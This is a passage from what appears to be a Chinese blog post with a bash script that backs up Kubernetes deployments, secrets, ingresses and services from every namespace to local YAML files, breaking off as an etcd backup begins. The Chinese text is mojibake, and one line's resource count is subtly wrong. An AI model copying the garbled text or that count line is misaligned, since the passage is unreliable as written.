è¿‡ä¸€ä¸ªnsçš„secretï¼Œéƒ½æ˜¯å¤§éº»çƒ¦ï¼\u003c/p\u003e\n\u003cp\u003eå…¶å®ç³»ç»Ÿæ˜¯æœ‰veleroå¤‡ä»½çš„ï¼Œä½†æ˜¯ä»é‚£é‡Œé¢å»å¼„å‡ºå•ç‹¬ä¸€ä¸ªnsçš„deployè¿›è¡Œæ¢å¤ï¼Œæ€ä¹ˆä¹Ÿæ¥ä¸åŠï¼Œé‚£å¹¸å¥½æœ‰æ¯æ—¥èµ„æºå¤‡ä»½ï¼Œç›´æ¥æ‹¿è¿‡æ¥é‡å»ºå³å¯ã€‚åˆ†äº«ä¸€ä¸‹è„šæœ¬ï¼Œé‚£æ³¨æ„ä¸€ä¸‹ï¼Œå› ä¸ºä¸»èŠ‚ç‚¹çš„etcdä¹Ÿæ˜¯éå¸¸è¦å‘½çš„ä¸œè¥¿ï¼Œä¹Ÿå¿…é¡»å¤‡ä¸€ä¸‹ï¼Œé˜²æ­¢ä¸»èŠ‚ç‚¹è„‘è£‚ï¼Œåˆ°æ—¶å€™å¯ä»¥ç”¨å¤‡ä»½è¿›è¡Œæ¢å¤ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eKUBECONFIG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/root/.kube/config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# K8s èµ„æºå¤‡ä»½è„šæœ¬\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç›®æ ‡ï¼šéå†æ‰€æœ‰å‘½åç©ºé—´ï¼Œå°† Deployment, Secret, Ingress, å’Œ Service å¯¼å‡ºä¸º YAML æ–‡ä»¶ã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è®¾ç½®è¾“å‡ºç›®å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOUTPUT_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/root/k8s_deployments_backup/\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +%Y%m%d\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¦å¤‡ä»½çš„èµ„æºç±»å‹åŠå…¶å¯¹åº”çš„ kubectl åˆ«å\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ³¨æ„ï¼šSecret èµ„æºä¼šå¤‡ä»½æ‰€æœ‰ç±»å‹ï¼ŒåŒ…æ‹¬è‡ªåŠ¨ç”Ÿæˆçš„ Service Account Tokensã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRESOURCE_TYPES\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;deployments\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ingresses\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;services\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¡®ä¿è„šæœ¬åœ¨é‡åˆ°é”™è¯¯æ—¶ç«‹å³é€€å‡º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- æ­£åœ¨åˆ›å»ºè¾“å‡ºç›®å½•: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ----------------------------------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ ¸å¿ƒå‡½æ•°ï¼šå¤‡ä»½æŒ‡å®šç±»å‹çš„èµ„æº\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å‚æ•°: $1 = èµ„æºç±»å‹ (å¦‚ deployment), $2 = å‘½åç©ºé—´, $3 = è¾“å‡ºç›®å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ----------------------------------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebackup_resource\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESPACE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eDIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# è·å–å½“å‰å‘½åç©ºé—´ä¸­æ‰€æœ‰è¯¥ç±»å‹èµ„æºçš„åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# ä½¿ç”¨ 2\u0026gt;/dev/null éšè—æ‰¾ä¸åˆ°èµ„æºæ—¶çš„é”™è¯¯ä¿¡æ¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eRESOURCES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ekubectl get \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.items[*].metadata.name}\u0026#39;\u003c/span\u003e 2\u0026gt;/dev/null\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -z \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;  [ä¿¡æ¯] å‘½åç©ºé—´ \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e ä¸­æœªæ‰¾åˆ° \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003eã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;  -\u0026gt; æ‰¾åˆ° \u003c/span\u003e\u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCES\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e ä¸ª \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003eï¼Œæ­£åœ¨å¯¼å‡º...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# éå†æ¯ä¸ªèµ„æºå¹¶ä¿å­˜ YAML\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e RESOURCE in \u003cspan class=\"nv\"\u003e$RESOURCES\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# æ–‡ä»¶åæ ¼å¼: namespace-resource_type-resourcename.yaml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eFILE_NAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNAMESPACE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.yaml\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eFILE_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_NAME\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# ä½¿ç”¨ kubectl get è·å– YAMLï¼Œå¹¶é€šè¿‡ç®¡é“å’Œ sed æ¸…ç†å…ƒæ•°æ®å­—æ®µ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kubectl get \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -o yaml --ignore-not-found \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"c1\"\u003e# æ¸…ç†å…ƒæ•°æ®å­—æ®µï¼Œä½¿ YAML æ›´å¹²å‡€ï¼Œä¾¿äºé‡æ–°åº”ç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  creationTimestamp:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  resourceVersion:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  uid:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  selfLink:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  status:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e          \u0026gt; \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# æ£€æŸ¥ Secret æ˜¯å¦ä¸º Service Account Tokenï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å‘å‡ºè­¦å‘Š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e grep -q \u003cspan class=\"s1\"\u003e\u0026#39;kubernetes.io/service-account.name\u0026#39;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;    [è­¦å‘Š] Secret \u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCE\u003c/span\u003e\u003cspan class=\"s2\"\u003e æ˜¯ Service Account Tokenï¼Œé€šå¸¸ä¸éœ€è¦å¤‡ä»½ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. è·å–æ‰€æœ‰å‘½åç©ºé—´ (Namespace)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAMESPACES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ekubectl get ns -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.items[*].metadata.name}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -z \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;é”™è¯¯ï¼šæœªæ‰¾åˆ°ä»»ä½•å‘½åç©ºé—´ã€‚è¯·æ£€æŸ¥ kubectl é…ç½®å’Œé›†ç¾¤è¿æ¥ã€‚\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;æ‰¾åˆ°ä»¥ä¸‹å‘½åç©ºé—´: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;----------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. éå†æ¯ä¸ªå‘½åç©ºé—´å’Œèµ„æºç±»å‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e NAMESPACE in \u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- å¤„ç†å‘½åç©ºé—´: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e TYPE in \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCE_TYPES\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        backup_resource \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- å‘½åç©ºé—´ \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e å¤„ç†å®Œæˆ ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eETCDCTL_API\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e etcdctl \u003cspan 